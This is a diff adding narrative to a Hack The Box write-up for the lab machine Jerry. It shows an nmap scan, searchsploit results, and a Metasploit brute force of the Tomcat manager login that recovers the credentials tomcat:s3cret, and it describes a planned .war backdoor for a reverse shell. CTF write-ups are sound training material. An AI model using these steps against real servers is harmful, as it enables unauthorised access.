@@ -1,3 +1,9 @@
+This is my write-up/walkthrough for [the Hack The Box machine, Jerry](https://app.hackthebox.com/machines/Jerry). It's a Windows machine, rated "Easy", with 10.10.10.95 as its IP address.
+
+![Alt text](/images/2022-02-16-hack-the-box-jerry-01.JPG "Jerry Info Card")
+
+I started with an nmap scan—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A 10.10.10.95
@@ -24,6 +30,14 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 51.05 seconds
 ```
 
+—that told me we've got Apache Tomcat running on port 8080 here. Nothing else of interest, and that told me I shouldn't look for anything else. This box is to be pwned by exploiting an Apache Tomcat vulnerability.
+
+Opening 10.10.10.95:8080 on my browser told me we are dealing with version 7.0.88 of Apache Tomcat. (Well, the nmap scan also pointed that out, but it's good to hit the URL once, if you can.)
+
+![Alt text](/images/2022-02-16-hack-the-box-jerry-02.JPG "Apache Tomcat 7.0.88")
+
+Running searchsploit on "Apache Tomcat 7.0.88"—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ searchsploit Apache Tomcat 7.0.88
@@ -34,16 +48,23 @@ Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass
 Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                               | jsp/webapps/42966.py
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
+```
 
-https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
+—pointed out that there is indeed a potential vulnerability out there for me to exploit. I started reading more into this. Turns out, if you have valid credentials for the "manager" application on the server, you can upload a backdoor in the form of a .war file on to the server, that should in turn get you a reverse shell. [This](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) is a good article on this, and the one I consulted for this hack.
 
-https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/
-```                                                                                                                                                                                             
+But, in order for me to exploit this vulnerability, I needed the right credentials on this "manager" application – 10.10.10.95:8080/manager.
+
+![Alt text](/images/2022-02-16-hack-the-box-jerry-03.JPG "Manager")
+
+Ran some [common username+password combos](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown), but none broke through.
+
+I wanted to try Metasploit, though, since I had been seeing it get mentioned a lot on the forums I had been lurking on, so I decided to give it a shot.
+
+Took me a while to figure out the right commands—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ sudo msfdb --help                                                                                                                                                                    1 ⨯
-[sudo] password for kali: 
 [-] Error: unrecognized action '--help'
 
 Manage the metasploit framework database
@@ -62,6 +83,8 @@ Example: PGPORT=5433 msfdb init
   msfdb status   # check service status
   msfdb run      # start the database and run msfconsole
 ```
+
+—but once I did, it was fairly simple.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -149,6 +172,13 @@ check out the result of hosts and services
 msf6 > 
 ```
 
+whoa.
+
+"Alright, how do I use it, though?" 
+
+Thankfully, I stumbled upon [this](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/) article which was fairly thorough. I ran a search on "tomcat manager":
+
+
 ```
 msf6 > search tomcat manager
 
@@ -166,7 +196,12 @@ Matching Modules
 
 
 Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/http/tomcat_mgr_login
+```
 
+That "tomcat_mgr_login" one seemed to be what we want since we first need the right credentials on this server, before we can even think of putting a backdoor that will get us the reverse shell.
+
+
+```
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > info
 
        Name: Tomcat Application Manager Login Utility
@@ -233,7 +268,12 @@ References:
   http://www.securityfocus.com/bid/36954
   http://tomcat.apache.org/
   https://nvd.nist.gov/vuln/detail/CVE-1999-0502
+```
 
+As far as I understood, point the right host and port to this module and it will bruteforce its way through and get you the credentials you need.
+
+
+```
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 10.10.10.95
 RHOST => 10.10.10.95
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8080
@@ -281,6 +321,10 @@ msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/http/tomcat_mgr_login) > 
 ```
+
+Got 'em! Our username+password combo is tomcat:s3cret.
+
+![Alt text](/images/2022-02-16-hack-the-box-jerry-04.JPG "Console")
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
